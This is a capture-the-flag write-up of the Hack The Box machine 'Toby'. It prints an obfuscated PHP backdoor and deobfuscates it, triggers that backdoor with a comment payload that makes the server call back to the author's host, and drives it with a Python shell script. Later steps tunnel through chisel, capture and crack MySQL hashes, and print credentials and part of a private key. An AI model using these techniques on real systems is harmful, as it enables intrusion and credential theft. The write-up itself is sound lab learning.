# Toby Machine (10.10.11.121)

## Info:

As always hackthebox bring so much learninng with insane machines, i learned so many new things like how proxychains work, how different network tools like ifconfig and ip work and how http proxy is different from socks proxy. This box was a insane linux machine where user was already attacked and we had to follow the path of attacker to get foothold and root on machine. 

*PS: I did this box after it retired and i read 0xdf blog and watched ippsec video before doing this.*

![Toby](https://user-images.githubusercontent.com/79413473/163706053-e08254d0-875c-440c-98d9-542be9a507b2.png)

## Recon:
Starting with port scan we get 4 open ports 

**rustscan -a 10.10.11.121 -u 5000**
```
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
10022/tcp open  unknown syn-ack
10080/tcp open  amanda  syn-ack
```
Although rustscan finds four open ports only 22 & 80 works. Rest gives connection reset error in browser. Anyway guessing at it **10080** is should be a webserver and **10022** a ssh server. 

Reading about [port 10080 amanda](https://social.technet.microsoft.com/Forums/en-US/8c38c8c4-b6c8-481a-837b-3f10af9d7e46/some-request-on-port-10080-amanda-in-tcp?forum=winserverNIS). It is a Backup solution (Advanced Maryland Automatic Network Disk Archiver) used by developers for storing multiple backups in one place. Let's run nmap on these ports.

**nmap -A -p22,80,10022,10080 -T4 10.10.11.121**

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-generator: WordPress 5.7.2
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Toby&#039;s Blog! \xF0\x9F\x90\xB4 &#8211; Just another WordPress site
10022/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 65:8c:9b:89:64:85:ea:ad:d9:df:d0:fc:6c:d1:97:e5 (RSA)
|   256 25:5e:dd:7b:09:4f:d7:8a:8e:48:ee:f4:52:13:d4:85 (ECDSA)
|_  256 74:88:25:2d:3d:80:ab:03:b9:f9:03:fc:0a:37:f7:e9 (ED25519)
10080/tcp open  amanda?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=2388b49ffb78bb6e; Path=/; HttpOnly
|     Set-Cookie: _csrf=FCLNuvNFw0367_x17zqRj_xrx1Q6MTY1MDE4MzU2MjIwNTEyNDYyOQ; Path=/; Domain=backup.toby.htb; Expires=Mon, 18 Apr 2022 08:19:22 GMT; HttpOnly
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Sun, 17 Apr 2022 08:19:22 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="FCLNuvNFw0367_x17zqRj_xrx1Q6MTY1MDE4MzU2MjI
|   HTTPOptions: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     X-Content-Type-Options: nosniff
|     Date: Sun, 17 Apr 2022 08:19:23 GMT
|     Content-Length: 108
```

As discussed 10022 is openssh and 10080 is backup server with domain name **backup.toby.htb**. And port 80 is running wordpress site with nginx.

Running vhsot scan found 

```
ffuf -u http://toby.htb/ -w ~/wordlist/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.toby.htb" -fw 434
```
![Screenshot from 2022-04-17 14-15-11](https://user-images.githubusercontent.com/79413473/163707372-bc989ac6-02c8-49b9-856b-8beff7b68cac.png)

Let's add these hosts to our */etc/hosts* file.

![Screenshot from 2022-04-17 14-08-48](https://user-images.githubusercontent.com/79413473/163707197-57b36333-843d-4839-aeb7-dfa6ef4c2781.png)

Toby.htb is a horse blog site with a note saying:
*Hi All! I’m back! And so are my pictures of 🐴 🙂 I managed to get all of them back after the attack because I had them up in the ☁*. 

Looks like they were attacked previously. 

![Screenshot from 2022-04-17 14-09-02](https://user-images.githubusercontent.com/79413473/163707230-8f2091b9-834d-4733-9baf-68888e9853d1.png)

Gogs is a open source git service.

While runninng **wpscan** in background with `-e u` enumerate users flag we got **toby** & **toby-admin**

![Screenshot from 2022-04-17 14-17-16](https://user-images.githubusercontent.com/79413473/163707425-5abcf614-d34d-40f7-88c2-784450d20e45.png)

Some default passwords doesn't work on wordpress login. 

## Foothold: Utilising backdoor placed by attacker.

### Finding wordpress backup

As we don't have any credentials let's register a new user on gogs.

![Screenshot from 2022-04-17 14-21-41](https://user-images.githubusercontent.com/79413473/163707582-1272c00f-523a-4711-9b61-4ed84fd41ff1.png)

In explore there is another user **toby-admin**. Now in this situation my first instinct was to somehow become toby-admin user and run command on it with githooks feature. But i was wrong. We had read in between the lines. As said before toby-admin was attacked but they had backup on cloud. And gogs is a cloud like service. It's possible there is a backup lying somewhere.

But **toby-admin**'s profile doesn't list any repository.

![Screenshot from 2022-04-17 14-29-57](https://user-images.githubusercontent.com/79413473/163707801-77ed6c86-af8f-48ff-9226-ddbcb6f7426b.png)

But while creating a repository we can notice there is unlisted feature for visibility option, which means it isn't private but also won't be shown on your profile.

![Screenshot from 2022-04-17 14-27-54](https://user-images.githubusercontent.com/79413473/163707821-6fa9ef7f-6fbd-48a1-8385-85e243f01a54.png)

And looking at repository url path it is **/username/repo_name**. 

![Screenshot from 2022-04-17 14-31-45](https://user-images.githubusercontent.com/79413473/163707850-3b28984b-0616-408f-b3d2-f1496f186af4.png)

chances are we can enumerate toby-admin's unlisted repo. let's do that

```
ffuf -u http://backup.toby.htb/toby-admin/FUZZ -w ~/wordlist/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
```

and it instantly pops **/backup** out.

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://backup.toby.htb/toby-admin/FUZZ
 :: Wordlist         : FUZZ: /home/ubuntu/wordlist/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

backup                  [Status: 200, Size: 14131, Words: 691, Lines: 454, Duration: 253ms]
stars                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 241ms]
followers               [Status: 200, Size: 7180, Words: 310, Lines: 252, Duration: 271ms]
following               [Status: 200, Size: 6816, Words: 294, Lines: 237, Duration: 222ms]
```

**backup** is a repo while others are user's info.

![Screenshot from 2022-04-17 14-36-40](https://user-images.githubusercontent.com/79413473/163707981-ea5b7a8e-bdde-4159-9157-c4ce042c02da.png)

It's name is **wordpress.toby.htb** Let's download it as zip file.

Let's get wordpress DB password from **wp-config.php** file 

```
define( 'DB_USER', 'root' );
define( 'DB_PASSWORD', 'OnlyTheBestSecretsGoInShellScripts' );
define( 'DB_HOST', 'mysql.toby.htb' );
```
This password doesn't work anywhere for now 

![Screenshot from 2022-04-17 14-45-56](https://user-images.githubusercontent.com/79413473/163708324-6ebd6e55-48ee-43a3-a420-20774ffbcc3e.png)

### Identifying backdoored file

To be honest this part was bit stomping to think that attacker has already backdoored the files before toby even backed them up. So toby ended up backing up malicious files. 

You can use some github tools like [this](https://github.com/tinwaninja/Simple-Backdoor-Scanner-PHP) for scanning malicious keywords inside files

![Screenshot from 2022-04-17 15-34-38](https://user-images.githubusercontent.com/79413473/163709879-f586fc8e-51de-40cd-bfa4-45bc57a019ff.png)

we can do that manually by grepping for these kywords and **wp-includes/comment.php** file stands out.

```
eval(gzuncompress(str_rot13(base64_decode('a5wUmlLSs+wWUodmvyoauDVkCx608xfu7oz+5h1AEms4++y1RRR00v+r3nMs+3Ev/qXJSRDYf2yRWmzxYtvX/9Z2h9F///MC1JvqKmdiGcw60DAkxrWTwpB5L268dB+ucSDgpoY+yqEqeJkXHKoW/u0imwjCLD0oF9IrJGj3+sSrNojfMoLPMoiQUd16CTqQYETFXMqBIEGi9OQeEOI40FVSAjac/QM37BIjlL1/W+dlPB6qLd3MSRnuSkGiS3MRitChxxCl7Z1LMPA+pzt5xpr5MGKnQB2yR+nlhxVWnFlKvd4g4SQgx7AKREhfzpgxzB+kazjpoGPitHonOLGigVDfT/YtgCX8PRInfpMGvSWRD/cP1tZTUu/ipdWaw3Q8qHgj1SinHVAQuzpfqT08IRxb....[Snip]..
```
Now we can replace eval with *echo* or *print* in a php script to see what decoded value is. Let's call it **backdoor.php**

```
<?php echo gzuncompress(str_rot13(base64_decode('a5wUmlLSs...[Snip]...))); ?>

```
Now this will give another eval function with encoded data

```
eval(gzinflate(base64_decode(str_rot13('UW3UohgXSxH/ck/NNGASQaeNG...[Snip]..)));
```
we can replace eval again with echo and loop over it until eval function disappear. Now it is a good practice to do these thing in a virtual machine as i also mistakenly ran the eval function in php by forgetting to replace **eval** with **echo**. But as it was not that malicious i was saved. 

Let's create a script to do match **eval** and replace it with `<?php echo` as we don't have to worry about ending tags `?>` in file as php works around it. And `<?php` is important for executing the script for next iteration otherwise it's gonna just keep printing echo function again and again.

Let's first create a initial decoded file from **backdoor.php**

`php backdoor.php > new1.php`

Now

```
for i in {1..100}; do php new$i.php | sed 's/eval/<?php echo /g' > new$((i+1)).php; done
```

+ It loops over 100 times. 
+ Execute current new1.php file and replace it's `eval` with `<?php echo` and 
+ save it for next file i.e new2.php, which will get executed in next iteration.

It creates 100 files and around 80 & 81 file we see a constant file size which means no more changes are being done in files and eval function is gone from script. 

![Screenshot from 2022-04-18 12-24-06](https://user-images.githubusercontent.com/79413473/163768379-c9c7f614-6549-4c34-96f9-3da855a7201e.png)

Let's read a file say **new100.php**. I Properly formatted it

```
if($comment_author_email=="help@toby.htb"&&$comment_author_url=="http://test.toby.htb/"&&substr($comment_content,0,8)=="746f6279"){
 
        $a=substr($comment_content,8)
        $host=explode(":",$a)[0]                      
        $sec=explode(":",$a)[1]
        $d="/usr/bin/wordpress_comment_validate"      // a php script
        include $d                                    // include that script
        wp_validate_4034a3($host,$sec)                // call a function which is probably inside that previous script. Sending host and port in function.
        return new WP_Error('unspecified error')

}
```

Now on based of few `if` checks like author's email and url and comment's first 8 characters it will take rest of the comment and split it on **:** delimeter and most probably in host & port format. Let's try that.

### Getting a reverse shell from wordpress comment

Let's comment on a post on wordpress blog with our payload 

![2022-04-18_12-30](https://user-images.githubusercontent.com/79413473/163769231-44ade3c6-e0b6-49f4-af58-d21220deeb96.png)

But nothing comes out and no connection received on my listener either.

![Screenshot from 2022-04-18 12-33-14](https://user-images.githubusercontent.com/79413473/163769650-4edb6fb7-3589-4657-96b6-3b89308b7ae2.png)

Let's start wireshark to see what happened, and send the request again from burp.

![2022-04-18_12-39](https://user-images.githubusercontent.com/79413473/163770385-c44efc26-f8d7-4f45-a108-78f64beb018c.png)

Request highlisghted blue shows that server is sending back connection on port **20053** instead of port we specified on comment. As we are not listening on port 20053 nothing happened. Let's do that.

![Screenshot from 2022-04-18 12-40-44](https://user-images.githubusercontent.com/79413473/163770627-b5b7e834-c602-41e0-9b50-0b0c61f80a5d.png)

This time we get something back. Which seems to be some uuid and some hex values. Let's decode hex 

```
echo 786f725f6b65793a63626337643964646430643063356334633964616466633064666339633564626466643164356334633663626438 | xxd -r -p
```

It gives again some hex value which is listed as a xor key.

```
xor_key:cbc7d9ddd0d0c5c4c9dadfc0dfc9c5dbdfd1d5c4c6cbd8
```
Which returns bunch of nonsense on decoding as `ËÇÙÝÐÐÅÄÉÚßÀßÉÅÛßÑÕÄÆËØ` . But if we xor it with port number we specified in request we made, we get something back

![Screenshot from 2022-04-18 12-49-10](https://user-images.githubusercontent.com/79413473/163771677-61e9c312-4ee9-4c4a-8642-20be0685a9a5.png)

Now few important point to notes at this point.

+ connection on our netact listener doesn't dies instead if we send some data it responds back.
+ This decoded xor key values changes with with every post rquest. I got **KEY_PREFIX_F_KEY_SUFFIX**. The middle key i.e F changes.
+ Port number should be even length, otherwise request fails.

As connection on 20053 is accepting data, let's figure out what it can be.

We send any arbitray data say `ffgfg`. It replies back with same string.

![Screenshot from 2022-04-18 13-21-38](https://user-images.githubusercontent.com/79413473/163775750-612bbcca-8e63-4087-b43e-0c9aedaa82e4.png)

Decoding it gives `%+"|` which is again some nonsense, let's xor it with key we got in `KEY_PREFIX_F_KEY_SUFFIX`  i.e. **F**. It gives `cmd:`.
As it's a backdoor we can give it command to get executed. Let's send `id` command

As it sending hex data which on decoding is xored with key F. I also xored my command with F and hex encoded it to send but it didn't work it responsed with default string i.e. encoded `cmd:`. The thing was that it only needed xored value, it doesn't have to be hex encoded.

Let's XOR **"id"** with F, gives **/"**. Let's send it.

![Screenshot from 2022-04-18 13-28-21](https://user-images.githubusercontent.com/79413473/163776631-be58f23a-7bcb-480e-ac53-eaccfdd41816.png)

This time response was different let's decoe it

![Screenshot from 2022-04-18 13-29-25](https://user-images.githubusercontent.com/79413473/163776803-9b5ec7ce-54f8-448b-bae1-720011894aed.png)

*PS: Mind that F is set as UTF-8 value instead of hex which is default, if you want to you have to first change F to hex i.e 46 then xor it with payload.*

which means we have code execution, and we can get a reverse shell from here. But let's first automate this whole process of sending requests and cataching response and sending payload.

One thing to note is that while creating script i ran into error of decoding hex as it was xored and out of range of utf encoding.

*UnicodeDecodeError: 'utf-8' codec can't decode byte 0xcb in position 0: invalid continuation byte*

But if we XOR a string with null byte(0x00) it returns same value. So in POST request we will send 00 as key i.e **comment=746f627910.10.16.2:00**. This helps in decoding hex values easily.

#### Automated Script: backdoor.py
```
#!/usr/bin/env python3

from pwn import *

def xor(c,key):
	#xor the input with key 
	output=""
	for i in c:
		output+=chr(key^ord(i))
	return output.encode()

l=listen(20053) #strating a listener
_ = l.wait_for_connection()
a=l.recvline()
a=a.decode() # decoding received data and extracting xor key
a=(bytes.fromhex(a.split("|")[1]).decode()).split(':')[1]

key=ord((bytes.fromhex(a).decode()).split("_")[2])
print(f"key extracted:{key}\n")

def execute(cmd,key):
	#Send command to backdoor and decode the output
	l.sendline(cmd)
	a=(l.recvline()).decode()
	a=bytes.fromhex(a.split("|")[1]).decode()
	a=xor(a,key)
	print(a.decode()[4:])

while True:
	try:
		c=input("cmd> ")
		execute(xor(c,key),key)
	except KeyboardInterrupt:
		print('closing connection...')
		break
```
Run this script and replay the POST request in burp, it will prompt you for command you wan to run and everything is handled in background.

![Screenshot from 2022-04-18 16-09-36](https://user-images.githubusercontent.com/79413473/163797106-1d42ab57-ea5d-4ac4-bb5f-f4ef16ba1f2c.png)

[0xdf](https://0xdf.gitlab.io/2022/04/16/htb-toby.html) did a great job with sending post request from python script also. I couldn't figure it out with pwntools, maybe next time. You can get a reverse shell from here or upgrade this shell to forward shell it can be a fun exercise for you too.

![Screenshot from 2022-04-18 20-36-57](https://user-images.githubusercontent.com/79413473/163828648-1538dc5b-dbea-4336-a033-aef8b730096d.png)

## Lateral Movement: Pivoting through dockers to get jack's RSA key

After stablising pty shell, we can start enumerating box. One thing we can note is that we are not on toby box yet. Hostname is wordpress. We are inside a docker and one with a very minimal tools

![Screenshot from 2022-04-18 20-40-16](https://user-images.githubusercontent.com/79413473/163829152-df03fae3-0ed4-4f34-8517-e89d3e6c7076.png)

Now one thing i learned from this box, how tools & binaries like **ifconfig**, **ss**, **ip** fetch detials. It's all inside **[/proc/net](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/s2-proc-dir-net)**

*This directory provides a comprehensive look at various networking parameters and statistics. Each directory and virtual file within this directory describes aspects of the system's network configuration.*

you can look at various files and find different ips. *tcp file has ip in hex format.

![Screenshot from 2022-04-18 20-53-10](https://user-images.githubusercontent.com/79413473/163830989-da761458-37ee-4c93-ac3e-778ed791fc27.png)

Luckily there is **curl** in container, so we can transfer files for better enumeration. Let's upload a [static nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) binary to machine and try to scan a whole range of 172.69.0.1-100.

But to my surprise it only shows 2 hosts up![Screenshot from 2022-04-18 21-05-16](https://user-images.githubusercontent.com/79413473/163832703-50d7c6b5-c159-49be-af1f-80dd2bf5c559.png)

We know there are more hosts from *arp* file in */proc/net*. Let's scan them manually.

+ **172.69.0.1** is host machine toby as we can see amanda port open also. 

![Screenshot from 2022-04-18 21-08-55](https://user-images.githubusercontent.com/79413473/163833258-af39a141-f95b-4919-bbe9-c1bdf5570dc7.png)

+ **172.69.0.101** is our current container i.e. wordpress

![Screenshot from 2022-04-18 21-09-52](https://user-images.githubusercontent.com/79413473/163833387-54609631-1800-4572-b22f-f3e57b7dde32.png)

+ **172.69.0.102** is **mysql.tobynet** i.e. mysql.toby.htb.

![Screenshot from 2022-04-18 21-11-08](https://user-images.githubusercontent.com/79413473/163833572-4d07fa35-21c3-495d-8ddb-3fdc8ff6ec92.png)

+ **172.69.0.104** is **personal.toby.htb**

![Screenshot from 2022-04-18 21-11-52](https://user-images.githubusercontent.com/79413473/163833702-cedfe26b-e0be-4b5f-82d7-ad78de4f8298.png)

+ **172.69.0.105** is gogs container.

![Screenshot from 2022-04-18 21-12-39](https://user-images.githubusercontent.com/79413473/163833799-163fa0b4-d0ed-4589-a468-654a7cb0bb00.png)

Now in order to access these hosts we will need to proxy it to our machine using **chisel**. Transfer chisel over victim machine.

Start a server on you machine to accept reverse connection on port 8001

```
./chisel server -p 8001 --reverse
```

from victim machine connect to this proxy server

```
./chisel client 10.10.16.2:8001 R:socks
```

![Screenshot from 2022-04-18 21-47-14](https://user-images.githubusercontent.com/79413473/163838411-79f3891e-1801-486d-b1a3-51a2b2a1e4a0.png)


You have to edit your */etc/proxychains.conf* file to use corrrect proxy that **socks5 127.0.0.1 1080**. Now you can ping and curl docker hosts from your machine. You might have to restart chisel server if getting any error. It took me some trial and error also.

### Extracting passwords from mysql.toby.htb(172.69.0.102)
Now if you remember we have password of DB user **root:OnlyTheBestSecretsGoInShellScripts**. Let's connect to this host using proxychains.

```
proxychains mysql -h mysql.toby.htb -u root -p
```
or 
```
proxychains mysql -h 172.69.0.102 -u root -p
``` 
Enter password and we are in 

![Screenshot from 2022-04-18 22-45-19](https://user-images.githubusercontent.com/79413473/163845953-bbc45cd0-7eac-4640-ae55-b0687d583f8a.png)

From gogs database we can extract **toby-admin** password hash

```
toby-admin@toby.htb: 8a611020ad6c56ffd791bf334d32d32748baae42975259607ce268c274a42958ad581686151fe1bb0b736370c82fa6afebcf
```

From wordpress we have 2 more hashes, `select user_login, user_pass, user_nicename,user_email from wp_users;`

```
+------------+------------------------------------+---------------+---------------------+
| user_login | user_pass                          | user_nicename | user_email          |
+------------+------------------------------------+---------------+---------------------+
| toby       | $P$Bc.z9Qg7LCeVxEK8MxETkfVi7FdXSb0 | toby          | toby@toby.htb       |
| toby-admin | $P$B3xHYCYdc8rgZ6Uyg5kzgmeeLlEMUL0 | toby-admin    | toby-admin@toby.htb |
+------------+------------------------------------+---------------+---------------------+
```

hashcat in no time cracks toby-admin's password with mode phppass(400)

```
$P$B3xHYCYdc8rgZ6Uyg5kzgmeeLlEMUL0:tobykeith1
```

### Getting shell on git docker instance,

Now if you remember in starting i said if we can become admin on **backup.toby.htb** we can execute commands with githooks. Let's login as toby-admin with cracked password. 
Although this step is not necessary i am just showing it for knowledge purpose, there was once a box where you had to get a shell this way.

githooks are code that run when a particular event happens on git repository. From settings i will modify pre-receive githook which get's executes when new code is pushed to repository.

![Screenshot from 2022-04-18 23-18-14](https://user-images.githubusercontent.com/79413473/163850626-11762bbe-94bf-47c6-bc92-3441e0f06a5f.png)

Let's put reverse shell in it.

![2022-04-18_23-11](https://user-images.githubusercontent.com/79413473/163850661-38429b2b-bd08-450f-a092-45417568d415.png)

Now modify/commit any file on repository you will get a shell. And to my surprise this container has more binaries to run unlike our wordpress container.

![Screenshot from 2022-04-18 23-20-26](https://user-images.githubusercontent.com/79413473/163850864-5adf9b18-0b9e-426e-8b45-fe1f96f0d0d3.png)

### personal.toby.htb(172.69.0.104)

If you wan to access this in browser you have to configure your browser proxy to SOCKS5 proxy i.e **SOCKS5 127.0.0.1 1080**. Also you have to disable cloudflare connection if using foxy proxy, ippsec showed it. I will work around it as it was always slow connection for me in browser. 

![Screenshot from 2022-04-18 23-44-52](https://user-images.githubusercontent.com/79413473/163854647-158c31b4-2f65-4e11-8876-185d6b1eb980.png)

I will use curl and we have source code for jack's personal webapp application on gogs. Let's download that and analyze

![Screenshot from 2022-04-18 23-47-55](https://user-images.githubusercontent.com/79413473/163854725-2ec20f74-7815-4b70-835a-78ce2811c98e.png)

*app.py*

```
 ...[Snip]....
 ## API START
 
 # NOT FOR PROD USE, USE FOR HEALTHCHECK ON DB
 # 01/07/21 - Added dbtest method and warning message
 # 06/07/21 - added ability to test remote DB
 # 07/07/21 - added creds
 # 10/07/21 - removed creds and placed in environment
 @app.route("/api/dbtest")
 def dbtest():
         hostname = "mysql.toby.htb"
         if "secretdbtest_09ef" in request.args and validate_ip(request.args['secretdbtest_09ef']):
                 hostname = request.args['secretdbtest_09ef']
         username = os.environ['DB_USERNAME']
         password = os.environ['DB_PASSWORD']
         # specify mysql_native_password in case of server incompatibility 
         process = Popen(['mysql', '-u', username, '-p'+password, '-h', hostname, '--default-auth=mysql_native_password', '-e', 'SELECT @@version;'], stdout=PIPE, stderr=PIPE)
         stdout, stderr = process.communicate()
         return (b'\n'.join([stdout, stderr])).strip()
 
 @app.route("/api/password")
 def api_password():
         chars = string.ascii_letters + string.digits
         random.seed(int(time.time()))
         password = ''.join([random.choice(chars) for x in range(32)])
         return Response(json.dumps({"password": password}), mimetype="application/json")
 
 ## API END
 ...[Snip]...
 
```
These API endpoints were interesting, as */api/password* gives different random password of 32 byte length. Which we can see why in **api_password()** function. 
Another interesting thing */api/dbtest* endpoint this enpoint issues a mysql connection and if we specify **secretdbtest_09ef** parameter in request it will issue a request to that host specified in parameter. Which means if we give it our host it will make a request to our host and we can grab username and password but password will be encrypted.

Let's do a simple curl request

```
proxychains curl 172.69.0.104/api/dbtest
```

It errors out with **ERROR 1045 (28000): Access denied for user 'jack'@'172.69.0.104' (using password: YES)**. We know username is jack and by default it made request to self host.

Let's change to that my host i.e 10.10.16.6

```
proxychains curl 172.69.0.104/api/dbtest?secretdbtest_09ef=10.10.16.6
```
and on my listener on port 3306(default mysql port), i receive connection but nothing happened. It just hanged

![Screenshot from 2022-04-19 12-21-16](https://user-images.githubusercontent.com/79413473/163943213-26a5544e-af61-49d7-899c-046e793a9d76.png)

Let's fire wireshark again and see what's going on also started my mysql server to receive mysql requests.

![Screenshot from 2022-04-19 12-26-57](https://user-images.githubusercontent.com/79413473/163944088-2414a9bf-b412-4715-bdac-4f41bee75c2c.png)

As you can see server is sending a sql connection on port 3306 but my machine is closing the connection With RST packet.(In red)

It happened because my mysql is accepting connection only locally and no remote connection is accepted. I had to edit my */etc/mysql/mysql.conf.d/mysqld.cnf* file for bind address from 127.0.0.1 to 0.0.0.0. And restart mysql server `sudo service mysql start`.

Now replay the curl request and look for requests in wireshark. We notice new error

![2022-04-19_12-43](https://user-images.githubusercontent.com/79413473/163946860-3cd3e365-b302-489f-b3a5-e9367148dcf7.png)

### Failed attempt to get jack's hash

Let's add this user to our database `create user jack@10.10.11.121 IDENTIFIED BY 'password';`

This helps in mitigating the connection drop error but doesn't help me much as i am getting no hashes in wireshark only salt, one thing i noticed is that 
although i don't get a hash in my wireshark but mysql table has a hash after the request. 

![2022-04-19_13-18](https://user-images.githubusercontent.com/79413473/163952784-b2b39fa5-cf21-4bb2-8977-0c649eae41f9.png)

![2022-04-19_13-19](https://user-images.githubusercontent.com/79413473/163952803-e8025e13-e254-4896-b767-75d0bb003bd1.png)

Another thing is by default my mysql had **caching_sha2_password** plugin which is more secure than **mysql_native_password**.

so to make things more compatible i will update jack user authentication plugin, 

```
ALTER USER jack@ IDENTIFIED WITH mysql_native_password BY 'youpassword';
```
Now this again hows no hash in wireshark. Salts changes with every request to prevent against replay attacks.

Now let's generate valid hash by combining evrything together `hex(salt_part1+salt_part2)+DB_hash` but one that still wen wrong was salt. After converting in hex it was unusaully longer than the format specified. Looks like i am getting salt for caching_sha_password plugin. Even me changing it didn't had any affect. 

Let's try MariaDB that's where ippsec did.

### Extracting jack's hash

I had to remove mysql completely as i messed up things and did fresh install of mariadb. Following previous steps, i changed bind address to **0.0.0.0** in */etc/mysql/mariadb.conf.d/50-server.cnf* file and restarted the service. 

Added a user jack in database `create user jack@toby.htb identified by 'password';`, and mariadb didn't add any plugin for this user.

![Screenshot from 2022-04-19 15-45-59](https://user-images.githubusercontent.com/79413473/163982646-05d94f3c-e2f5-41fa-b7b4-4b98eadc035d.png)

Now i sent curl request `proxychains curl 172.69.0.104/api/dbtest?secretdbtest_09ef=10.10.16.6` . Now it successfully showed correct hash and salt along with username.

![Screenshot from 2022-04-19 15-47-41](https://user-images.githubusercontent.com/79413473/163982925-2590070a-1487-4d6a-94f3-f6a01aeeea27.png)

![2022-04-19_15-47](https://user-images.githubusercontent.com/79413473/163982944-b30f74de-cfb1-44af-a8fe-43ec620f05b3.png)

Let's quickly complete the hash and crack it with hashcat

```
$mysqlna$293e3e5a2e706d543d7145435f342764466e7831*30e66315818a7c8792c175424b290754eb803c6f
```
but rockyou won't be able to crack it. 

### Cracking password by custom wordlist

Now if you remember app.py file it had a password generator, maybe jack has also used that.

```
#07/07/21 - added creds
#10/07/21 - removed creds and placed in environment
```

```
chars = string.ascii_letters + string.digits
random.seed(int(time.time()))
password = ''.join([random.choice(chars) for x in range(32)])
```
Now this password generation logic is not so secure, as it's seeding time.time() to random. seed tells random from where to start, time.time() returns epoch time, int is rounding off the epoch.

![Screenshot from 2022-04-19 16-00-42](https://user-images.githubusercontent.com/79413473/163985001-3126e423-1ace-42e6-a1db-edbdeea519c5.png)

If credential was added on 07/07/21 and removed on 10/07/2021 which was seeded in epoch format to random. we can also generate all possible password from 07th to 10th of july  

Let's write a python script to quickly do that. 

```
import string
import random

for i in range(1625569999,1625969001):
	chars = string.ascii_letters + string.digits
	random.seed(i)
	password = ''.join([random.choice(chars) for x in range(32)])
	#print(password)
	with open ('password.txt','a+') as f:
		f.write(password+"\n")
```
It loops over all possible epoch time between 7th and 10th of july. Actually 1625569999 is mid of 6th and 1625969001 is mid of 11th. just to be on safe side as there is a time difference of 5 hour and 30 minutes between my time and machine time. It created 399002 password entries. Now using hashcat we can crack it easily.

```
!hashcat/hashcat -m 11200 "\$mysqlna\$293e3e5a2e706d543d7145435f342764466e7831*30e66315818a7c8792c175424b290754eb803c6f" password.txt
``` 

I cracked it on google colab. 
```
$mysqlna$293e3e5a2e706d543d7145435f342764466e7831*30e66315818a7c8792c175424b290754eb803c6f:4DyeEYPgzc7EaML1Y3o0HvQr9Tp9nikC
```
![Screenshot from 2022-04-19 17-09-59](https://user-images.githubusercontent.com/79413473/163995531-ca13e0c2-e951-4069-b64e-d7be79ce69f4.png)

using this password we can try to ssh on different hosts we have. One it worked was **mysql.toby.htb(172.69.0.102)**.

`proxychains ssh jack@172.69.0.102` : `4DyeEYPgzc7EaML1Y3o0HvQr9Tp9nikC`.

![Screenshot from 2022-04-19 21-08-07](https://user-images.githubusercontent.com/79413473/164042019-8f12cdab-53fb-4374-8861-03ef2095a3cb.png)

### Finding jack's ssh-keys

As we are still inside a docker and nothing much is there we can run linpeas and pspy to enumerate processes in container. As even curl is gone from this container we will use scp for this.

`proxychains scp ./pspy64 jack@172.69.0.102:/tmp`

Running this reveals that there is a process running which creates a sqldump of wordpress and transfer it to host machine(172.69.0.1) as backup using temporary RSA keys.

![2022-04-19_21-16](https://user-images.githubusercontent.com/79413473/164043919-1a069ae0-87f2-4c13-bd47-5e05cd1a1c55.png)

Let's try to read this key, i wrote this script and transferred it to system via scp. We could have used a simple while loop to try to read the file but we will get a bunch of *file not exist error on terminal*.

```
#!/bin/bash

FILE=/tmp/tmp*/key  

if [ -f $FILE ]; then
    sleep 1
    cat /tmp/tmp*/key
    sleep 5
fi
```
Sleep commands are there so that it doesn't read the file multiple time and fill your screen, and after read you have 5 secons to exit the script easily.
Let's run this script in a while loop. `while :; do bash script.sh;done`. Few seconds later we get jack's key

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAoklCLF2ADUXkxp6NeQjdMjpoNbc0PUG2wumQ10nf1aIl3pils2QS
ZYvEGk+eYsJZCnnLZTe2kJ8U073MrpVlmLtmHlDtdKCZfEguzc9nZjKHIICamNsMNhpTLs
1Z0dnymm/A3ie4LXfpNYji8RB0jiVYV3J5caD1otl6E3PvGeD80Reb9WVIuvyrw6nsHNiL
CCaJw8i4m6YY0QeG5lKm0pfW9Cw2Zqyl7XoQOU81MD3HhV7DJAWrj7/OPIDBhdjzhoySyO
